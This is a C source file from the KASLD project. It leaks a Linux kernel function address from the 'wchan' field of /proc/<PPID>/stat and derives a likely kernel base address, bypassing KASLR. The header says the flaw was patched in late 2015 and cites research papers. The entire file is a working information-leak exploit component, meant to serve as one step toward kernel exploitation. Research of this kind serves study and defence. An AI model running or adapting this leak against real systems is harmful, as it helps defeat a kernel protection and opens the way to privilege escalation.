// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Leak the parent process waiting kernel function virtual address
// from /proc/<PPID>/stat wait channel 'wchan' field. Patched late 2015.
//
// References:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=b2f73922d119686323f14fbbe46587f863852328
// https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf
// https://marcograss.github.io/security/linux/2016/01/24/exploiting-infoleak-linux-kaslr-bypass.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "kasld.h"

unsigned long get_kernel_addr_proc_stat_wchan() {
  FILE *f;
  char path[32];
  unsigned long addr = 0;
  char buff[BUFSIZ];
  char delim[] = " ";
  char *ptr;
  char *endptr;

  snprintf(path, sizeof(path), "/proc/%d/stat", (pid_t)getppid());

  printf("[.] checking %s 'wchan' field ...\n", path);

  f = fopen(path, "rb");
  if (f == NULL) {
    printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  if (fgets(buff, BUFSIZ, f) == NULL) {
    printf("[-] fgets(%s): %m\n", path);
    return 0;
  }

  ptr = strtok(buff, delim);
  while ((ptr = strtok(NULL, delim)) != NULL) {
    addr = (unsigned long)strtoull(&ptr[0], &endptr, 10);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
      break;

    addr = 0;
  }

  fclose(f);

  return addr;
}

int main(int argc, char **argv) {
  unsigned long addr = get_kernel_addr_proc_stat_wchan();
  if (!addr)
    return 1;

  printf("leaked wchan address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);

  return 0;
}
